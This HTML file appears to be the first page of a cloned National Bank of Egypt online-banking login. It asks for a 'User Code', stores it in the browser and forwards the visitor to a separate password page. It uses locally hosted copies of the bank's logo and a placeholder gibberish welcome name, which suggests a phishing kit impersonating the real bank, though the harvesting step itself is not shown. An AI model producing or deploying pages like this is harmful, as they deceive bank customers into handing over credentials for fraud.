<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NBE - Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="login-theme.css">
    <style>
        .form-control { text-align: left; }
        .form-group { text-align: left; }
        .forgot-link { text-align: left; }
    </style>
</head>
<body>

<header class="site-header">
    <div class="header-left">
        <div class="menu-btn"><i class="fas fa-bars"></i></div>
        <a href="login.html" class="lang-switcher">
            <span>العربية</span>
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3c2.3 2.5 3.5 5.5 3.5 9s-1.2 6.5-3.5 9c-2.3-2.5-3.5-6.5-3.5-9S9.7 5.5 12 3z"></path></svg>
        </a>
    </div>
    <div class="header-right">
        <img src="static_nbe_logo_full.png" alt="National Bank of Egypt">
    </div>
</header>

<main class="login-shell">
    <div class="login-card-container">
        <div class="card-logo">
            <img src="static_nbe_logo_full.png" alt="National Bank of Egypt">
        </div>

        <div class="user-types">
            <div class="type-card">
                <i class="fas fa-building"></i>
                <span>Corporate</span>
            </div>
            <div class="type-card active">
                <i class="far fa-user"></i>
                <span>Individual</span>
            </div>
        </div>

        <div class="welcome-msg">Welcome, <span>lgguhfuughuy</span></div>
        <h1 class="page-heading">User Code</h1>

        <section class="login-card">
            <div id="errorMessage" role="alert"></div>
            <form id="step1Form">
                <div class="form-group">
                    <label class="form-label">User Code</label>
                    <div class="form-control-wrapper">
                        <input type="text" id="username" name="username" class="form-control" placeholder="User Code" required autofocus>
                    </div>
                </div>
                <a href="#" class="forgot-link">Forgot User Code?</a>
                
                <button type="submit" class="submit-btn">Login</button>
            </form>
        </section>

        <div class="register-section">
            <a href="#" class="register-title">Register Now</a>
            <p class="register-text">Join National Bank of Egypt customers</p>
        </div>
    </div>
</main>

<script>
document.getElementById('step1Form').addEventListener('submit', function(event) {
    event.preventDefault();
    const username = document.getElementById('username').value;
    if (username) {
        localStorage.setItem('temp_username', username);
        window.location.href = 'password_en.html';
    }
});
</script>
</body>
</html>
